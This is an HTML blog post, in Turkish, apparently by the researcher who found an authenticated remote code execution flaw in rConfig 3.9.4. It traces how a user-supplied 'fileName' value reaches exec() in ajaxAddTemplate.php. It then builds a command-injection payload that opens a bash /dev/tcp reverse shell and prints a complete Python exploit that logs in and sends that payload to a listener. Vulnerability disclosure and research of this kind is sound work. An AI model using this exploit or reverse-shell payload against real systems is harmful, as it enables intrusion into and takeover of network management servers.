@@ -1,0 +1,206 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="A Pathetic Soul, ">
+
+
+        <title>rConfig 3.94 Authenticated Remote Code Execution</title>
+
+
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.3.0/pure-min.css">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.1.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/theme/css/pure.css">
+    <link rel="stylesheet" href="/theme/css/pygments.css">
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/fitvids/1.0.1/jquery.fitvids.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $(".content").fitVids();
+        });
+    </script>
+</head>
+
+<body>
+<div class="pure-g-r" id="layout">
+    <div class="sidebar sidebar-article pure-u">
+        <header class="header-article">
+            <hgroup>
+                <a href="/author/engindemirbilek.html" title="See posts by EnginDemirbilek">
+                </a>
+                <h2 class="article-info">EnginDemirbilek</h2>
+                <small class="about-author"></small>
+                <h5>Published</h5>
+                <p>Sat 29 February 2020</p>
+                <a href="/">&larr;Home</a>
+            </hgroup>
+        </header>
+	</div>
+    <div class="pure-u">
+        <div class="content">
+            <section class="post">
+                <header class="post-header">
+                    <h1>rConfig 3.94 Authenticated Remote Code Execution Zafiyeti</h1>
+                        <p class="post-meta">
+                            //Exploit-DEV                         </p>
+                </header>
+            </section>
+		<p>Merhaba, <a href="http://pandorafms.org/">rConfig</a> adında açık kaynaklı bir ağ yönetim yazılımında bulduğum Authenticated RCE zafiyetinin detaylı bulumunu anlatıyor olacağım.
+          Bir önceki yazıda olduğu gibi türkçeye kaynak kazandırmak adına makaleyi türkçe kaleme aldım.</p>
+
+<p><strong>AUTHENTICAD RCE </strong></p>
+<p>Authenticated, zafiyetinin tetiklemesi için geçerli bir kullanıcı gerekli olduğunu belirtir. RCE ise uygulama üzerinden uygulamanın çalıştığı sunucuda sistem kodları çalıştırabilmemize olanak sağlayan zafiyet türüdür.</p>
+
+      <p>  <strong>rConfig</strong></p>
+<ol>
+<li>Uygulama indirme linki: <a href="https://www.rconfig.com/download">rConfig Downloads</a></li>
+<li>Zafiyeti tespit ettiğim sürüm: 3.9.4</li>
+</ol><br>
+
+
+<p><strong>BÖLÜM 1: Uygulama Eldesi</strong></p>
+<p>Kaynak kod analizini keyfi istekler doğrultusunda yapmamdan ötürü bu uygulamanın adını <a href="https://www.exploit-db.com/search?q=rconfig">Exploit-DB</a> üzerinde gezinirken gördüm. Benim tespit ettiğim zafiyet harici rce zafiyetleride bulunuyordu.
+Uygulamanın doğrudan bir OVA dosyası olmamasından ötürü el ile  kurulum gerektiyor fakat kuruluma dair direktifler dağıtımcı tarafından resmi website üzerinde yayınlanmış. Bende bu <a href="http://help.rconfig.com/gettingstarted/installation">kurulum kılavuzunu</a> takip ederek VMWARE Fusion üzerinde sanal bir Centos sunucuda uygulamayı kurdum.
+<p><img alt="rConfig" src="/images/rConfig/rconfig-ilk.png"></p>
+</p><br>
+
+<p><strong>Bölüm 2: Kaynak Kod Eldesi</strong></p>
+<p></p>
+<p>Kurulum direktiflerini takip ettiğimde uygulamanın kaynak kodlarının /home/rConfig dizinine koyulduğunu tespit ettim.</p>
+<p><img alt="rConfig" src="/images/rConfig/rconfig-kaynak-kod.png"></p>
+<p>Kodları daha uygun bir ortadamda IDE üzerinden incelemek için dizini <a href="https://wiki.ubuntu-tr.net/index.php?title=Tar_komutu_kullan%C4%B1m%C4%B1">TAR</a> ile sıkıştırdım ve SCP kullanarak ana makineme aktardım.</p>
+<div class="highlight"><pre><span></span>tar -czvf rconfig.tar.gz /home/rConfig/
+scp root@rConfigIP:/home/rConfig/rconfig.tar.gz /tmp/rconfig.tar.gz
+</pre></div><br>
+
+
+<p><strong>Bölüm 3: Kaynak Kodun İncelenmesi</strong></p>
+        <p>Dosyaları kendi tercih ettiğim <a href="https://atom.io/"> ATOM</a> idesini kullanarak kurcalamaya başladım.</p>
+<p>Statik kaynak kod analizlerinde komut çalıştırmaya dair bir zafiyet arıyorsak başlı başlı dikkat etmemiz gereken bazı fonksiyonlar var. Bunların bir kaçına örnek olarak;
+  <code>
+system, exec, shell_exec, popen, eval, passthru
+  </code>
+  fonksiyonları verilebilir.
+</p>
+<p> IDE üzerinde tüm projede bulunan php dosyalarında yukarıda belirttiğim fonksiyonları aramaya başladım ve boşa çıkan bir kaç saat ve tespit edilen RCE harici bir kaç zaafiyetin sonunda <strong>ajaxAddTemplate.php</strong> dosyasının 49. satırında zafiyetli olabileceğini ön gördüğüm bir noktaya rastladım.
+  <p><img alt="rConfig" src="/images/rConfig/rconfig-finding-point.png"></p>
+<p>Sistem fonksiyonu olarak <strong>exec()</strong> fonksiyonu kullanılıyor ve <strong>$fullpath </strong>isminde henüz nereden geldiği belli olmayan bir değişkeni parametre olarak alıyordu.
+Dosyayı biraz daha kurcaladığım vakit <strong>$fullPath</strong> değişkenine 23. satırda <strong>$fileName</strong> isimli başka bir değişkenin eklendiği tespit ettim.
+<p><img alt="rConfig" src="/images/rConfig/rconfig-finding-point-2.png"></p>
+Ve <strong>$fileName</strong> değişkeni yine aynı dosyanın 14-22. satırları arasında kullanıcıdan POST isteğiyle alınıyor ve eğer yoksa sonuna <strong>.yml</strong> uzantısı ekleniyordu.
+<p><img alt="rConfig" src="/images/rConfig/rconfig-finding-point-3.png"></p>
+	    <strong>.yml</strong> uzantısı hariç girdiye herhangi bir müdahale yok yani bu durumda bu girdiyi RCE zafiyetini tetiklemek için kullanabiliriz.
+</p><br>
+
+<p><strong>Bölüm 4: Payload Hazırlanması</strong></p>
+<p>
+<strong>exec()</strong> fonksiyonu içerisine <strong>$fullpath</strong> değişkeni gidiyor. Bu değişkenin ön tanımlı bir değeri örnek olarak "/home/rconfig" daha sonra dizin değerine bizden alınan $fileName değişkeni ekleniyor.
+Bu durumda ilk olarak değişkenimize <code>;</code> karakteri verirsek <strong>$fullpath</strong> değişkeninden gelen değerden kurtulmuş oluyoruz. Ek olarak, <strong>$fileName</strong> değişkenine <strong>.yml</strong> uzantısı veren
+bir kontrolde bulunuyordu. Aynı şekilde payloadın sonunada <code>;</code> karakteri koyarak bu uzantı ekleme işleminide atlatabiliriz.
+<br>Oluşan payload taslağımız: <strong> ; REVERSESHELL CODE;</strong><br>
+Uygulama varsayılan olarak centOS üzerinde çalışıyor bu sebeple PANDORAFMS de olduğu gibi reverse shell için netcat kullanamayız fakat <strong>bash</strong> kullanabiliriz.
+<p>Bash reverse shell: bash -i >& /dev/tcp/10.0.0.1/8080 0>&1</p>
+<p>Bununla beraber sonuç payladımız: <strong> ;bash -i >& /dev/tcp/IP/8080 0>&1;</strong></p>
+</p>
+<br>
+
+<p><strong>BÖLÜM 5: EXPLOIT</p></strong>
+Exploit-DB: <a href="https://www.exploit-db.com/exploits/48207">Exploit</a>
+    <div class="highlight"><pre><span></span>
+'''
+rConfig 3.93 Authenticated remote code execution.
+Author: Engin Demirbilek
+Author Blog: engindemirbilek.github.io
+'''
+
+import requests
+import sys
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+if len(sys.argv) < 6:
+	print "Usage: ./exploit.py http(s)://url username password listenerIP listenerPort"
+	exit()
+
+url = sys.argv[1]
+user = sys.argv[2]
+password = sys.argv[3]
+payload = ";bash -i >& /dev/tcp/{}/{} 0>&1;".format(sys.argv[4], sys.argv[5])
+
+login = {
+	'user':user,
+	'pass':password,
+	'sublogin':'1'
+}
+req = requests.Session()
+print "Sendin login request ..."
+login = req.post(url+"/lib/crud/userprocess.php", data=login, verify=False)
+
+payload = {
+	'fileName':payload,
+}
+
+
+
+print "[+] Sendin exploit ..."
+
+exploit = req.post(url+"/lib/ajaxHandlers/ajaxAddTemplate.php",cookies=req.cookies, data=payload, headers={
+'User-Agent':'Mozilla/5.0 Gecko/20100101 Firefox/72.0',
+'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+'Accept-Encoding':'gzip, deflate',
+'Content-Type':'application/x-www-form-urlencoded'},verify=False)
+
+if exploit.status_code == 200:
+	print "[+] Everything seems ok, check your listener."
+else:
+	print "[-] Exploit failed,  system is patched or credentials are wrong."
+
+</pre></div><br>
+
+<video id="rConfig exploitation" class="video-js vjs-default-skin" controls
+preload="auto" width="683" height="384"
+data-setup="{}">
+<source src="/images/rConfig/rConfig-exploitpoc.mov" type='video/mp4'>
+</video>
+
+
+
+
+            <div class="hr"></div>
+            <a href="#" class="go-top">Go Top</a>
+<footer class="footer">
+    <p>&copy; A Pathetic Soul &ndash;
+        Built with <a href="https://github.com/PurePelicanTheme/pure">Pure Theme</a>
+        for <a href="http://blog.getpelican.com/">Pelican</a>
+    </p>
+</footer>        </div>
+    </div>
+</div>
+    <script>
+        var $top = $('.go-top');
+
+        // Show or hide the sticky footer button
+        $(window).scroll(function() {
+            if ($(this).scrollTop() > 200) {
+                $top.fadeIn(200);
+            } else {
+                $top.fadeOut(200);
+            }
+        });
+
+        // Animate the scroll to top
+        $top.click(function(event) {
+            event.preventDefault();
+            $('html, body').animate({scrollTop: 0}, 300);
+        })
+
+        // Makes sure that the href="#" attached to the <a> elements
+        // don't scroll you back up the page.
+        $('body').on('click', 'a[href="#"]', function(event) {
+            event.preventDefault();
+        });
+    </script>
+</body>
+</html>
